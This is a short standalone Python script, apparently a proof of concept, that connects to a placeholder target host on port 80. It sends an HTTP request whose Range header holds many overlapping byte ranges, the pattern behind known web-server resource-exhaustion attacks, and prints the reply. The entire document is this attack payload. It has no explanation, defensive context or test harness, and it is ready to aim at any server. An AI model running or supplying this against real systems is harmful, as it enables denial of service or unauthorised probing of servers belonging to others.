import socket

host = 'TARGET_IP_OR_DOMAIN'
port = 80

payload = (
    "GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Range: bytes=0-,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9\r\n"
    "Connection: close\r\n\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.send(payload.encode())
response = sock.recv(4096)
print(response.decode(errors='ignore'))
sock.close()
